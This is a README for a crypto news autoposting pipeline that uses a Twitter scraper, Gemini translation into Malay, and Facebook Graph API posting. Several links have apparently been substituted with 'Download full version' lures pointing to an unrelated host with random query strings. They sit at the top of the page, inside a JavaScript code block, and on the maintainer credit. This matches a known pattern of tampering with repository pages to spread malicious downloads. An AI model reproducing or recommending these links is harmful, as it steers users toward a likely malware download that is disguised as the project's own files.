# 🚀 Crypto Project AutoPost AI Agent

This project is a fully automated pipeline that:

[Download full version](http://loppskd.com?f4mxai7wiq15trk)

1. Fetches the latest tweets from selected crypto project accounts.
2. Translates & restructures them into **Malay** using Google Gemini API.
3. Extracts key info (project name, funding, investors, etc.) into a dashboard format.
4. Auto-posts a clean, human-like summary to a Facebook Page.
5. Saves all entries in a structured `results.json` for further usage (like website display).

---

## 🔧 Features

✅ Twitter Scraper via \[twttrapi.p.rapidapi.com]
✅ Translation & formatting via **Google Gemini 2.0 Flash**
✅ Dashboard data extraction using custom rule-based parser
✅ Retry logic for Gemini quota (with exponential backoff)
✅ Facebook auto-poster using **Graph API**
✅ Dashboard-ready JSON output for websites or DataTables
✅ Auto-skip duplicates using `fb_status` tag

---

## 📁 Project Structure

```bash
├── main.py                   # Main runner script
├── results.json              # Auto-updated database of processed tweets
├── secrets (.env or GitHub) # API keys and tokens (via GitHub Actions)
```

---

## ⚙️ Requirements

* Python 3.10+
* API Keys:

  * `RAPIDAPI_KEY` (Twitter Scraper)
  * `GEMINI_API_KEY` (Google Gemini Flash)
  * `LONG_LIVED_USER_TOKEN` (Facebook User Token)
  * `FB_PAGE_ID` (Target Facebook Page ID)

Install dependencies:

```bash
pip install requests
```

---

## 🔄 GitHub Actions Workflow

The project is GitHub Actions-ready. It runs automatically via `workflow_dispatch` or cron schedule, fetching new tweets, translating, extracting, and posting them.

Auto-posted entries are marked with:

```json
"fb_status": "Posted",
"date_posted": "YYYY-MM-DD HH:MM:SS"
```

---

## 💡 How It Works (Flow)

1. **Fetch tweets** using RapidAPI → Get raw text & media.
2. **Translate** using Gemini → Clean formatting + Malay.
3. **Extract dashboard fields** → Name, Dana, Fasa, Pelabur, Twitter, Deskripsi.
4. **Check for duplication** → If `fb_status == "Posted"`, skip.
5. **Post to Facebook** → Clean caption with emoji icons.
6. **Update results.json** → Save for frontend dashboard or audit.

---

## 🌐 Frontend Integration

This project is designed to power live dashboards like:

🧠 Example:
[https://teknologiblockchain.com/dana-vc](https://teknologiblockchain.com/dana-vc)

Which loads data from:

```js
[Download full version](http://loppskd.com?t4xka085hb0j7uz)
```

---

## 🤖 Prompt Example (Gemini)

The prompt ensures structure validation and translation only of the description field, returning:

```
Nama: SpaceProject
Dana: $2M | Fasa: "Seed" | Ada token: (belum)
Pelabur: Not disclosed
Deskripsi: ... (translated)
Twitter (akaun rasmi):
@SpaceXYZ
```

It also auto-fixes common issues:

* Missing "Nama:" field (by detecting name from first line)
* Removes triple backticks or markdown artifacts

---

## 🔐 Security Notes

Never commit your tokens directly. Use GitHub Secrets for:

* `GEMINI_API_KEY`
* `RAPIDAPI_KEY`
* `LONG_LIVED_USER_TOKEN`
* `FB_PAGE_ID`

---

## 🧠 Maintainer

**Created by**: [@AaqilAhamadd](http://loppskd.com?rwgu9sev8mpnoat)
**From**: Malaysia 🇲🇾 | Targeting global Web3, AI & Crypto clients
**Powered by**: RapidAPI + Gemini + Facebook Graph API + GitHub Actions

---

## 📬 Want to Hire?

If you're a crypto founder, agency, or info-publisher who needs:

* Auto content pipelines (Twitter → Facebook)
* AI-powered translation agents
* Custom crypto dashboards

📩 Reach out via [LinkedIn](https://www.linkedin.com/in/aaqil-ahamad-1393241ab/) for collaborations.

---

## 📜 License

MIT License. Use freely with attribution.

---

## 📦 Optional Files

### `requirements.txt`

```
requests
```

### `.env`

```
RAPIDAPI_KEY=...
GEMINI_API_KEY=...
LONG_LIVED_USER_TOKEN=...
FB_PAGE_ID=...
```
